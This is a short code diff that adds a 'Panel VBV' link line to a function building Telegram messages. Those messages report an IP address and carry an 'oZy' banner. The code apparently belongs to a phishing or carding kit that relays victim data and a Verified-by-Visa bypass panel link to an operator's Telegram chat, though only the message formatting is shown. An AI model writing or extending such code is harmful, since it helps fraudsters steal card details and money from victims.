@@ -75,6 +75,11 @@ export function buildTelegramMessage(
   // IP
   message += `│🌐 IP: ${escapeTelegram(ip)}\n`;
   
+  if (panelLink) {
+    message += `│\n`;
+    message += `│🔗 Panel VBV: ${escapeTelegram(panelLink)}\n`;
+  }
+  
   message += `│\n`;
   message += `│===========oZy===========\n`;
   
